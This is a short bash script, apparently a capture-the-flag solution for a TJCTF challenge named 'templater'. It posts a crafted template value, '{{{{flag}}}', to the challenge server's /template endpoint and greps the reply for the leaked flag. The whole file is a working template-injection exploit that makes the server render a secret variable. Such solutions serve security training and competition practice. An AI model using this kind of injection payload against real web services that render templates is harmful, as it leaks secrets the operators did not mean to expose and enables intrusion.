#!/bin/bash
BASE_URL=${1:-https://templater-f542a41eed424698.tjc.tf}
curl -s -X POST -d 'template={{{{flag}}}' ${BASE_URL}/template | grep -o 'tjctf{\w*' | tr -d '\n'
echo }
